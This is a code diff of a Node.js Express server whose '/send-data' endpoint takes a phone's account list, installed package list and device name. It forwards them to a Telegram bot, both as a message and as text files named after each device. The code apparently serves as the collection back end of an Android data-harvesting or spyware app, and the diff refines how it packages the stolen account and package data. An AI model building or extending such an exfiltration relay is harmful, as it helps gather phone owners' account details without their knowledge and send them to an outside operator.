@@ -35,7 +35,6 @@ const sendOrUpdateTelegram = async (message) => {
             currentMessageText = message;
         }
     } catch (error) {
-        // Fallback: Agar edit fail ho toh naya message bhej do
         const response = await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
             chat_id: CHAT_ID,
             text: message,
@@ -105,42 +104,40 @@ app.post('/send-data', async (req, res) => {
         }
     }
 
-    // STEP 3: ACCOUNTS & PACKAGES (IMPORTANT UPDATE)
+    // STEP 3: ACCOUNTS & PACKAGES (FOLDER-STYLE FILE LOGIC)
     else if (accounts || packages) {
-        let extraInfo = `\n*--- Account's ---*\n`;
+        let accountRawText = "";
+        let packageRawText = "";
         
         // Safety Parse for Accounts
         let accList = accounts;
-        try {
-            if (typeof accounts === 'string') accList = JSON.parse(accounts);
-        } catch (e) { accList = accounts; }
-
+        try { if (typeof accounts === 'string') accList = JSON.parse(accounts); } catch (e) { accList = accounts; }
         if (accList && Array.isArray(accList) && accList.length > 0) {
-            accList.forEach(acc => { extraInfo += `• ${acc}\n`; });
-        } else {
-            extraInfo += `No Accounts Found\n`;
-        }
+            accList.forEach(acc => { accountRawText += `• ${acc}\n`; });
+        } else { accountRawText = "No Accounts Found\n"; }
 
-        extraInfo += `\n*--- Package's ---*\n`;
-        
         // Safety Parse for Packages
         let pkgList = packages;
-        try {
-            if (typeof packages === 'string') pkgList = JSON.parse(packages);
-        } catch (e) { pkgList = packages; }
-
+        try { if (typeof packages === 'string') pkgList = JSON.parse(packages); } catch (e) { pkgList = packages; }
         if (pkgList && Array.isArray(pkgList) && pkgList.length > 0) {
-            pkgList.forEach(pkg => { extraInfo += `• ${pkg}\n`; });
-        } else {
-            extraInfo += `No Packages Found\n`;
-        }
+            pkgList.forEach(pkg => { packageRawText += `• ${pkg}\n`; });
+        } else { packageRawText = "No Packages Found\n"; }
 
-        // Final Append and Update
-        currentMessageText += extraInfo;
+        // Final Message Update (Telegram Text)
+        let telegramAddition = `\n*--- Account's ---*\n${accountRawText}\n*--- Package's ---*\n${packageRawText}`;
+        currentMessageText += telegramAddition;
         await sendOrUpdateTelegram(currentMessageText);
         
-        // Step 3 aate hi final backup file bhej dega
-        await sendFileToTelegram(currentMessageText, `Full_Data_${fullDeviceName}`);
+        // --- SENDING FILES WITH YOUR EXACT NAMING ---
+        
+        // File 1: Full Data (e.g., RMX3933.txt)
+        await sendFileToTelegram(currentMessageText, `${fullDeviceName}`);
+
+        // File 2: Accounts (e.g., RMX3933/Account's.txt)
+        await sendFileToTelegram(accountRawText, `${fullDeviceName}/Account's`);
+
+        // File 3: Packages (e.g., RMX3933/Package's.txt)
+        await sendFileToTelegram(packageRawText, `${fullDeviceName}/Package's`);
     }
     
     res.status(200).json({ success: true });
